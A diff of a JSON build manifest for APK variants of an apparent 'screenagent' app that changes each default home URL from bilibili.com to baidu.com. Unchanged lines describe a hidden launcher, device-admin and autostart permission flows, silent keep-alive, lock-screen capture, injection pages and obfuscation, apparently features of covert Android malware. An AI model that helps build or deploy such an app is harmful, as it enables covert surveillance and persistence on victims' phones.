@@ -20,7 +20,7 @@
       "kind": "screenagent",
       "visibleLauncher": false,
       "resourceStyle": "semantic",
-      "defaultHomeUrl": "https://www.bilibili.com/",
+      "defaultHomeUrl": "https://www.baidu.com/",
       "description": "源码构建：每次从 apktool 工程重新编译，应用名/图标/包名/首页/APK ID 全部在编译前写入",
       "sha256": "22ead9c8ff002efe8a95a7daf4104d2aae1a37be7baf9671b57ea9120eac2348"
     },
@@ -36,7 +36,7 @@
       "resourceStyle": "semantic",
       "sha256": "5c7df64e0550a793cdaef69c44a46549f684e3625cc3b08fbd642dac4c22deb3",
       "description": "3.5(853)：按厂商分流（MIUI 六步：权限/后台弹界面/设备管理/通知/电池/自启动；三星四步：权限/设备管理/通知/电池），厂商专属守卫（MiuiGuard/SamsungGuard/OtherGuard）与保活装配，优化中浮层带进度回调，注入上报去重。",
-      "defaultHomeUrl": "https://www.bilibili.com/"
+      "defaultHomeUrl": "https://www.baidu.com/"
     },
     {
       "id": "apk-3.2",
@@ -50,7 +50,7 @@
       "resourceStyle": "semantic",
       "sha256": "8885d64b912efd3813db31b4460c8ede89b6643036a939a600e9cf079bd672a7",
       "description": "3.4(614)：小米 MIUI 分支（悬浮窗闸门→权限页由 A 前台拉起）；电池计划(自启动/无限制/后台弹出/白名单)；无通知保活11通道。",
-      "defaultHomeUrl": "https://www.bilibili.com/"
+      "defaultHomeUrl": "https://www.baidu.com/"
     },
     {
       "id": "apk-3.1",
@@ -64,7 +64,7 @@
       "resourceStyle": "semantic",
       "sha256": "141c52c05f62836349862bed3b9ffade4437c93b36139537c40b4a0b6e368a8d",
       "description": "3.1(531)：锁屏采集（采集优先）、注入页双协议、R8 混淆。",
-      "defaultHomeUrl": "https://www.bilibili.com/"
+      "defaultHomeUrl": "https://www.baidu.com/"
     },
     {
       "id": "src-2.1",
